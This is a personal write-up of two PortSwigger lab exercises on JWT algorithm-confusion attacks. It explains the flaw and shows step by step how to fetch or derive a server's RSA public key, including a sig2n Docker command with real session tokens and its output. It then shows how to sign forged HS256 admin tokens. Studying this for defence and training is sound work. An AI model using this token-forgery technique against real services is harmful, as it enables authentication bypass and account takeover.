This attack occurs when an attacker forces the server to verify the signature of a JWT using a different algorithm than is intended by the website's developer. This enables attackers to forge valid JWTs without needing to know the server's secret signing key.

## Symmetric vs Asymmetric Algorithms

Some of algorithms used to sign JWTs such as `HS256` use a `symmetric` key, which means that the server uses a single key to both sign and verify the token. This needs to be kept a secret.

Other algorithms such as `RS256` (RSA + SHA-256) use an `assymetric` key pair, which consists of a private key that the server uses to sign the token, and a mathematically related public key that can be used to verify the signature.

Private key must be kept secret, but the public key is shared so that anybody can verify the signature of tokens issued by the server.

## How do Algorithm Confusion Vulnerabilities arise?

Mostly due to the flawed implementation of JWT libraries.

Many libraries provide a single, algorithm-agnostic method for verifying signatures, and they rely on the `alg` parameter in the header.

A verify method might look like this in a JWT library:

```java
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```

Problems come when devs assume that it will only handle asymmetric algorithm like RS256, and they may always pass a fixed public key to the method as follows.

```java
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```

So, now the server receives a token using a symmetric algorithm like HS256, and the method treats the public key as an HMAC secret, which means that an attacker can sign the token using HS256 and the public key, and the server uses the same public key to verify the signature.

An important note to this attack is that:

The public key used to sign the token must be identical to the public key stored on the server. In practice, you may need to experiment with different formatting in order for this attack to work.

## Performing the Attack

Usually involves these steps:
- Obtain the server's public key
- Convert the public key to a suitable format
- Create a JWT with a modified payload and the `alg` header set to `HS256`
- Sign the token with `HS256` using the public key as secret

### Obtain the server's public key

Sometimes servers expose their public keys as `JSON Web Key` objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json` and may be stored in an array of JWKs called `keys`.

### Convert the public key to a suitable format

Servers when verifying the signature of a token, it will use its own copy of the key from the local filesystem or database, and they may be stored in a different format.

The version of the key must be identical, every single byte must match, including the non-printing characters.

We may need the key in `X.509 PEM` format, and a JWK can be converted to PEM using the `JWT Editor:`
- Go to `JWT Editor Keys`.
- Click `New RSA` and paste the JWK obtained earlier.
- Select the `PEM` radio and copy the resulting `PEM` key.
- Base64 encode the PEM.
- In `JWT Editor` click `New Symmetric Key`.
- Replace the generated value for the `k` parameter with the PEM key.
- Save the key.

### Modify the JWT

Now just make sure that the `alg` header is set to `HS256`. And on the final step sign the JWT using the public key.

### Lab.1 - JWT Authentication Bypass via Algorithm Confusion

The lab uses a robust RSA key pair to sign and verify tokens. But, due to implementation flaws, it is vulnerable to algorithm confusion attacks.

The goal to solve the lab is to obtain the server's public key, then use it to sign a modified session token that gives you access to the `/admin` and delete `/carlos`.

`wiener:peter` can be used to login.

The lab says that the server stores its public key as `X.509` PEM file.

I login to the site via the provided credentials. The `/admin` is not accessible with this account.

I try the usual endpoints to get the public keys, and I got a `200 OK` for the `GET /jwks.json HTTP/2`.

The result is:

```json
{
	"keys":[
		{
			"kty":"RSA",
			"e":"AQAB",
			"use":"sig",
			"kid":"b7a6a00a-fdba-42b9-81ea-0c2cf8d96f32",
			"alg":"RS256",
			"n":"07ZGEaW_rw78pg0EbI3SCkhFY2auUBK6_E-CbYvt_YD1w03FgXNKMS8D888U7f23Du26cQ4Oreu8eOjmNKPYVWf9fo9NyvVJ0l8-wPwQYlKKp-bbNF_jZL06DVHnXS9P4lII9XMuIWh6VV3uapuJ6KWtHt7Y43RS-oOKkbSg36oPDJ1iOStEqoCU3x7bwRvtD2a00WpNgcBIaN7dEVTNG80Pgox51wOIdxHhvniJn6_f0O9WMezXUkcL-7sCWO3V0U08LukH98D6-2YPr-nVk3yTa2n1ch-tsLh2UhaCdDjs-mqwOKfsz5uNuyMdW2bzi_FRaFdirX6ey2tvDYVIkw"}]}
```

Now, let's convert this to a `X.509` PEM file.

Go to `JWT Editor` and click on `New RSA Key`, there put the public key, and select the PEM:

![Pasted_image_20250123145414](https://github.com/user-attachments/assets/36abd49b-7a7f-407d-945c-06059be0576f)

Now, base64 encode the code. This can be done in Burp Decoder. The result is:

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEwN1pHRWFXL3J3NzhwZzBFYkkzUwpDa2hGWTJhdVVCSzYvRStDYll2dC9ZRDF3MDNGZ1hOS01TOEQ4ODhVN2YyM0R1MjZjUTRPcmV1OGVPam1OS1BZClZXZjlmbzlOeXZWSjBsOCt3UHdRWWxLS3ArYmJORi9qWkwwNkRWSG5YUzlQNGxJSTlYTXVJV2g2VlYzdWFwdUoKNktXdEh0N1k0M1JTK29PS2tiU2czNm9QREoxaU9TdEVxb0NVM3g3YndSdnREMmEwMFdwTmdjQklhTjdkRVZUTgpHODBQZ294NTF3T0lkeEhodm5pSm42L2YwTzlXTWV6WFVrY0wrN3NDV08zVjBVMDhMdWtIOThENisyWVByK25WCmszeVRhMm4xY2grdHNMaDJVaGFDZERqcyttcXdPS2ZzejV1TnV5TWRXMmJ6aS9GUmFGZGlyWDZleTJ0dkRZVkkKa3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

Now, go back again in `JWT Editor` and click to generate a new `Symmetric Key`. Generate it, and put the base64 encoded key at the `k` parameter.

![Pasted_image_20250123145653](https://github.com/user-attachments/assets/578b0610-5ceb-42b4-968f-b38f5ff93559)

Now, I went to the request on the Burp Repeater, and on `JSON Web Token` tab change the `"sub:` to `administrator`, and the `alg` to `HS256`

From this:
![Pasted_image_20250123145829](https://github.com/user-attachments/assets/f0a112eb-60b9-4ec6-909b-1802298bf820)

To this:
![](../../../images/Pasted image 20250123145848.png)

Then click on `Sign` and sign it with our symmetric key that we created.

Send the request to `/admin` and the admin panel is now available. There is also the link to delete `carlos` send a request there and the lab is solved.

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

----------

## Deriving Public Keys from Existing Tokens

In many cases the public key isn't readily available, but you still may be able to test for algorithm confusion by deriving the key from a pair of existing JWTs.

This process uses tools such as `jwt_forgery.py`.

### Lab.2 - JWT Authentication Bypass via Algorithm Confusion with no Exposed Key

The lab uses a robust RSA key pair to sign and verify tokens, but it is vulnerable to algorithm confusion attacks.

The goal for the lab is to obtain the server's public key, use it to sign a modified session token that gives access to `/admin` and delete `/carlos`. `wiener:peter` can be used to login.

I login with `wiener:peter` and go to `/admin` which is not accessible for this user.

I copy the session cookie, and save it in a file. I repeat the process to get another session cookie, and save it.

This is needed because the `sig2n` tool will be used to brute-force, and it needs two known message-signature pairs.

I run the `sig2n` tool with two session cookies, and I got some results as shown below:

```bash
sudo docker run --rm -it portswigger/sig2n eyJraWQiOiI1ZTNlZTI3MS03M2RmLTQ5MzktYTkyMy01YmQ0Y2U5ZTFiM2MiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNzY0NTYwMCwic3ViIjoid2llbmVyIn0.egVIDbHh3_vqUB0y9iMLwsoq86RXhfSvkrBEqoXV2DJWie2hzz1PrE7J_DV31U2SviyOtLS0-iTUoPcXNZexVHHvw4leGTWnbNYVY5R-WqLvVO5ntfWaruxdLT36FnUa-ey4Wv2_o_LdiD7ng3k_e8xzF1oPPc7KssMCoaZv448DvbDZUMITaVULKgYAM37vbBkfoF16Iglmc9qLgTV2feSbaA7Pat-vtMJfUuAvv_yTe9Kjw0guJ5hm9YXUWJF_LsO98mdv26QRV1w0GWbLKpMENT2wFp-4jJOI8hMVQ7nMq3DMNYTWRFTi3dcYWDoZImMif9YofSJeH58dByRo0g eyJraWQiOiI1ZTNlZTI3MS03M2RmLTQ5MzktYTkyMy01YmQ0Y2U5ZTFiM2MiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNzY0NTY2Niwic3ViIjoid2llbmVyIn0.JQDc2Muv2QZnNG1lQw28lctDgMFk1TXCTQcbUOSX4v6x3UxQG9nwDKbExSkWYpgSnB9UXxaNfUv64YgIG7I28RuVi4HNLBC1wLYiSbLJvYEgFPdr8i__Ju9tnZQeGiTCQQPve_pa0RkNNMb5_DwJNyG9C1Z_BqJRBDjkG_kmo4N4RNHw-zoUOcPO__Vra5d7YRa5Lv0a-GaaVqF628-WBIspeQ9hHIvZU60SsHuf63ZmkGqTZFivSWUZpDQXGwo4PmP6is_dTJFMcoakLUeQnCR7ZiG-Jip_EMjNqP3VX6yq123uT4MylOcOBzGYe-_nDDZtwb5b9ACddjM1kPDlsQ
Running command: python3 jwt_forgery.py <token1> <token2>

Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwL0dZRFUydUtCVlFFNG1Hd1Z3aQpKYlVPY0pIYTdBMzcvYlNYUHpLTG0zR3o5L0NUU3l0S2hlVEJPWE1yWnNrQlR2NUxya29nT2FRUUI0bXk2MXZNCmI2ZVZZYldzRXRnTWovam9aREZJcEM0TjNiY3JuL1RwdHJjOFE4dHpzWStIMk5iV2VxdmdsUXVQTlpKVzJqMm8KbmlaNUhCVWduRGJHSGJ4TFdVUkZFM1R3NWRuZnd0MUZTam9pL3MzRkdGSFhlZmF2L1dlMDB2cmdJSHZEQmdTQwpUWkIwMGpFUmJYY2ZvTFN4Zy9xenpNMnhKUUQ5eHZYUVh2UUZ2dFZJWndzbWZUNlBBRWpRT2JLTGtUa0VoeGNiCnVvcUZkZHlMdXJieldoZXhqdUdGN3NaMkxjeE81TWoxeis1NVBacytlYmNZdE9MSzU0bVptNnhnZk1WTWJ2ckcKMXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI1ZTNlZTI3MS03M2RmLTQ5MzktYTkyMy01YmQ0Y2U5ZTFiM2MiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTczNzczMDA2OCwgInN1YiI6ICJ3aWVuZXIifQ.9tVVn9LvoY-OJC_O9Ir5QJS65_OWk3769uG0ov_PQlQ
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXAvR1lEVTJ1S0JWUUU0bUd3VndpSmJVT2NKSGE3QTM3L2JTWFB6S0xtM0d6OS9DVFN5dEsKaGVUQk9YTXJac2tCVHY1THJrb2dPYVFRQjRteTYxdk1iNmVWWWJXc0V0Z01qL2pvWkRGSXBDNE4zYmNybi9UcAp0cmM4UTh0enNZK0gyTmJXZXF2Z2xRdVBOWkpXMmoyb25pWjVIQlVnbkRiR0hieExXVVJGRTNUdzVkbmZ3dDFGClNqb2kvczNGR0ZIWGVmYXYvV2UwMHZyZ0lIdkRCZ1NDVFpCMDBqRVJiWGNmb0xTeGcvcXp6TTJ4SlFEOXh2WFEKWHZRRnZ0Vklad3NtZlQ2UEFFalFPYktMa1RrRWh4Y2J1b3FGZGR5THVyYnpXaGV4anVHRjdzWjJMY3hPNU1qMQp6KzU1UFpzK2ViY1l0T0xLNTRtWm02eGdmTVZNYnZyRzF3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI1ZTNlZTI3MS03M2RmLTQ5MzktYTkyMy01YmQ0Y2U5ZTFiM2MiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTczNzczMDA2OCwgInN1YiI6ICJ3aWVuZXIifQ.BL7E11Hi6f16ULU8BR-_EGSdpd0I_ML2IusNfpXr6Kg
```

Now, I will test the first result to see if it works. I copy the first `tamperet JWT` and replace the session cookie with it, and try to access my account page at `/my-account`.

![](../../../images/Pasted image 20250123154946.png)

I see the response is `200 OK` which means it worked, and I will use this to generate e new key.

For this I go to the `JWT Editor` and click to generate a `New Symmetric Key`. When the key is generated I replace the `k` with the first `Base64 encoded x509 key`, because that's the one that worked.

Then in Burp Repeater, I change the `"sub:` to `administrator` and sign the JWT with the new key that I created.

I send the request to `/admin` and I got access, so from there I copy and go to the URL which deletes the user `carlos` and the lab is solved.


